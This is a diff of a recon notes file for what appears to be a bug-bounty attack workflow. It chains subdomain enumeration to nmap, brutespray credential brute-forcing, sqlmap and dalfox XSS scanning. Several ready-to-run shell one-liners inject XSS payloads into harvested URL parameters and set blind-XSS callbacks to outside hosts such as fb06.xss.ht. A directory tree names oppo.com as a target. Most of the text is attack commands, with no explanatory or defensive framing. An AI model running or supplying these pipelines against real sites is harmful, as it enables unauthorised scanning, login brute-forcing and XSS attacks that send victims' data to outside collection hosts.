@@ -1,6 +1,48 @@
 
-https://github.com/hakluke/hakrawler
-https://github.com/tomnomnom/waybackurls
+subdomains --> ip --> nmap --> brutespray
+          |
+          |--> hakrawler --> dalfox
+          |             |--> sqlmap
+          |
+          |--> nuclei
+          |--> gobuster dir
+          |--> gobuster --> dalfox
+          |--> gau --> findom-xss
 
-https://github.com/0xbharath/censys-enumeration
-https://github.com/appsecco/the-art-of-subdomain-enumeration/blob/master/crtsh_enum_psql.sh
+
+
+brutespray - https://github.com/x90skysn3k/brutespray
+dalfox     - https://github.com/hahwul/dalfox
+findomxss  - https://github.com/dwisiswant0/findom-xss
+gau        - https://github.com/lc/gau
+gobuster   - https://github.com/OJ/gobuster
+hakrawler  - https://github.com/hakluke/hakrawler
+nuclei     - https://github.com/projectdiscovery/nuclei
+qsreplace  - https://github.com/tomnomnom/qsreplace
+
+
+$ gospider -S tageturls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'|grep "=" | qsreplace -a | dalfox pipe -o result.txt
+
+$ cat target_list | waybackurls -no-subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | qsreplace | qsreplace -a | dalfox -pipe -blind https://hahwul.xss.ht
+
+$ cat target_list| gau | egrep -o "http?.*" | grep "="| egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -blind https://fb06.xss.ht -o result.txt
+
+https://gist.github.com/dwisiswant0/c133bebc2f413766e3cc3d15fdcfd36d
+
+$ assetfinder [host] | hakrawler -plain -usewayback -wayback | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -b https://your.xss.ht -o out.txt
+
+
+DIRECTORY STRUCTURE
+
+reconin.sh (root)
+    - config
+        - amass
+        - subjack
+        - tko-subs
+    - out
+        - oppo.com
+            - subs
+                - src
+                - takeover
+            - asn
+    - tools
